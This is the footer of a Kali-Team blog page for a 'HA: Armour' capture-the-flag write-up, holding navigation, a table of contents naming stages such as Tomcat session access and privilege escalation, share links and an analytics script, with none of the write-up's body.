         
          <li><a href="https://www.yuque.com/kali-team">项目</a></li>
         
          <li><a href="/search/">搜索</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#信息收集"><span class="toc-number">1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tomcat-获取会话"><span class="toc-number">2.</span> <span class="toc-text">tomcat 获取会话</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#权限提升"><span class="toc-number">3.</span> <span class="toc-text">权限提升</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#提Root权限"><span class="toc-number">4.</span> <span class="toc-text">提Root权限</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://blog.kali-team.cn/2019/10/09/HA-Armour-Write-up/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=https://blog.kali-team.cn/2019/10/09/HA-Armour-Write-up/&text=HA: Armour-Write-up"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://blog.kali-team.cn/2019/10/09/HA-Armour-Write-up/&title=HA: Armour-Write-up"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://blog.kali-team.cn/2019/10/09/HA-Armour-Write-up/&is_video=false&description=HA: Armour-Write-up"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=HA: Armour-Write-up&body=Check out this article: https://blog.kali-team.cn/2019/10/09/HA-Armour-Write-up/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=https://blog.kali-team.cn/2019/10/09/HA-Armour-Write-up/&title=HA: Armour-Write-up"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=https://blog.kali-team.cn/2019/10/09/HA-Armour-Write-up/&title=HA: Armour-Write-up"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://blog.kali-team.cn/2019/10/09/HA-Armour-Write-up/&title=HA: Armour-Write-up"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=https://blog.kali-team.cn/2019/10/09/HA-Armour-Write-up/&title=HA: Armour-Write-up"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://blog.kali-team.cn/2019/10/09/HA-Armour-Write-up/&name=HA: Armour-Write-up&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2019 Kali-Team
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/about/">关于</a></li>
         
          <li><a href="/archives/">归档</a></li>
         
          <li><a href="https://www.yuque.com/kali-team">项目</a></li>
         
          <li><a href="/search/">搜索</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">

    <!-- jquery -->
<script src="/lib/jquery/jquery.min.js"></script>
<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
<script src="/js/main.js"></script>
<!-- search -->

<!-- Google Analytics -->

    <script type="text/javascript">
        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
        ga('create', 'UA-141810677-1', 'auto');
        ga('send', 'pageview');
    </script>

<!-- Baidu Analytics -->

<!-- Disqus Comments -->


</body>
</html>
